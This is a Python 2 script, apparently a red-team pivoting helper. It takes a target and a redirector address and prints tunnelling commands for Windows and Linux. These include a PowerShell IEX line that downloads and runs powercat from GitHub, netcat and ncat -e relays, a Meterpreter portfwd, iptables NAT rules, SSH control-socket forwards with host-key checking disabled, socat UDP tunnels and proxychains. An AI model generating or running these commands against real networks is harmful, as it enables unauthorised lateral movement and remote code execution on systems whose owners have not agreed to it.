#!/usr/bin/python
from random import randint
from os import system
import socket
import os, fnmatch

ip=raw_input ("What is the target IP? : ")
port=raw_input ("What is the target Port? : ")
Rip=raw_input ("What is the Redirectors IP? : ")

class bcolors:
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def MyIP():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

def get_control_socket():
    socket_list = fnmatch.filter(os.listdir('/tmp'), '*.ssh')
    if not socket_list:
        socket = "<socket>.ssh"
    else:                                                                                               
        count = 1
        for file in socket_list:
            print (count), (file)
            count += 1
        socket_choice= raw_input ("Which Control Socket would you like to use?" )
        socket = socket_list[int(socket_choice)-1]
    return socket


mysocket = get_control_socket()
myip = MyIP()
randport = str(randint(32768, 65534))
system('clear')
print bcolors.WARNING + 'Windows Tunnels' + bcolors.ENDC
print bcolors.OKGREEN + 'Firewall PortForward:' + bcolors.ENDC
print 'netsh interface portproxy add v4tov4 listenport='+str(randint(32768, 65534)),' listenaddress='+(Rip), 'connectport='+(port),' connectaddress='+(ip)
print ('')
print bcolors.OKGREEN + 'Download PowerCat:' + bcolors.ENDC
print 'IEX (New-Object System.Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\')'
print 'powercat -c',(myip),'-p',(randport),'-r tcp:'+(ip)+':'+(port)
print bcolors.OKBLUE + 'Local Listener:' + bcolors.ENDC
print 'nc -l -p',str(randint(32768, 65534)), '0<backpipe | nc -l -p', (randport), 'tee backpipe' 

print ('')
print bcolors.OKGREEN + 'Meterpreter PortForward:' + bcolors.ENDC
print 'portfwd add -l '+str(randint(32768, 65534)),'-p',(port),'-r',(ip)
print ('')

print bcolors.WARNING + 'Linux Tunnels' + bcolors.ENDC
print bcolors.OKGREEN + 'Firewall PortForward:' + bcolors.ENDC
print 'sysctl net.ipv4.ip_forward=1'
print 'iptables -t nat -A PREROUTING -p tcp -d '+(Rip)+ ' --dport '+str(randint(32768, 65534)),'-j DNAT --to-destination ' +(ip)+':'+(port)
print 'iptables -t nat -A POSTROUTING -p tcp -d ' +(ip)+ ' --dport '+(port)+ ' -j SNAT --to-source ' +(Rip)
print ('')
print bcolors.OKGREEN + 'NetCat:' + bcolors.ENDC
print 'cd /tmp'
print 'mknod backpipe q'
print 'nc -v -l -p '+str(randint(32768, 65534)), '0<backpipe | nc '+(ip),(port), '| tee backpipe'
print 'ncat -lvnk '+str(randint(32768, 65534)),'-e "/usr/bin/ncat',(ip),(port),'"' 
print ('')
print bcolors.OKGREEN + 'SSH Forward Tunnels:' + bcolors.ENDC
print 'ssh -O forward -S /tmp/'+(mysocket), '-L 0.0.0.0:'+str(randint(32768, 65534))+':'+(ip)+':'+(port), 'user'                                                                                                
print 'ssh -vx -M -S /tmp/<NewSocket>.ssh root@'+(ip), '-o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking no"'
print ('')
print bcolors.OKGREEN + 'UDP SSH Tunnel:' + bcolors.ENDC
print bcolors.OKBLUE + 'Local:' + bcolors.ENDC                                                          
print 'ssh -O forward -S /tmp/'+(mysocket), '-L',(randport)+':127.0.0.1:'+(randport), 'user' 
print 'socat -t15 udp-recvfrom:'+(port)+',reuseaddr,fork tcp:localhost:'+(randport)+'&'
print bcolors.OKBLUE + 'Remote:' + bcolors.ENDC
print 'socat tcp4-listen:'+(randport)+',reuseaddr,fork UDP:'+(ip)+':'+(port)+'&'
print ('')
print bcolors.OKGREEN + 'SSH Dynamic Tunnels:' + bcolors.ENDC
print 'ssh /tmp/'+(mysocket), 'user@'+(Rip)+' -Nf -D 0.0.0.0:1090'
print 'proxychains /bin/bash'
print ('')


